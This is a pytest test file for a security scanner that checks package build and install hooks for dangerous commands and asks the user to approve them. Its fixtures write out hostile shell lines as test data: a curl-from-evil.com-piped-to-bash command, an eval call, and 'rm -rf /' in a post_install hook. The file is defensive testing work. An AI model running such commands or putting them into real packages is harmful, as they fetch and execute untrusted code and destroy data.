import pytest
from sven.security.hook_scanner import scan_file, scan_pkgbuild_dir, prompt_hook_approval, ScanResult, Finding

def test_scan_file_clean(tmp_path):
    clean_file = tmp_path / "clean.sh"
    clean_file.write_text("#!/bin/bash\necho 'hello world'\n")
    findings = scan_file(str(clean_file))
    assert len(findings) == 0

def test_scan_file_dangerous(tmp_path):
    bad_file = tmp_path / "bad.sh"
    bad_file.write_text("#!/bin/bash\ncurl -s http://evil.com | bash -c\n")
    findings = scan_file(str(bad_file))
    
    assert len(findings) >= 2
    patterns = [f.pattern_matched for f in findings]
    assert "curl" in patterns
    assert "bash -c" in patterns

def test_scan_pkgbuild_dir(tmp_path):
    # simulate a pkg dir
    pkg_dir = tmp_path / "mypkg"
    pkg_dir.mkdir()
    
    (pkg_dir / "PKGBUILD").write_text("pkgname=foo\neval $(echo 'evil')\n")
    (pkg_dir / "foo.install").write_text("post_install() {\n  rm -rf /\n}\n")
    
    res = scan_pkgbuild_dir(str(pkg_dir))
    assert not res.safe
    assert len(res.findings) == 2
    
    patterns = [f.pattern_matched for f in res.findings]
    assert "eval" in patterns
    assert "rm -rf /" in patterns
    
def test_prompt_hook_approval_safe(mocker):
    # If safe, auto returns 'R'
    res = ScanResult(safe=True, findings=[])
    action = prompt_hook_approval("testpkg", res)
    assert action == "R"

def test_prompt_hook_approval_abort(mocker):
    res = ScanResult(safe=False, findings=[Finding(1, "curl x", "curl", "CRITICAL")])
    mocker.patch("builtins.input", return_value="A")
    action = prompt_hook_approval("testpkg", res)
    assert action == "A"

def test_prompt_hook_approval_skip(mocker):
    res = ScanResult(safe=False, findings=[Finding(1, "curl x", "curl", "CRITICAL")])
    mocker.patch("builtins.input", return_value="S")
    action = prompt_hook_approval("testpkg", res)
    assert action == "S"

def test_prompt_hook_approval_override(mocker):
    res = ScanResult(safe=False, findings=[Finding(1, "curl x", "curl", "CRITICAL")])
    mocker.patch("builtins.input", side_effect=["R", "YES"])
    action = prompt_hook_approval("testpkg", res)
    assert action == "R"
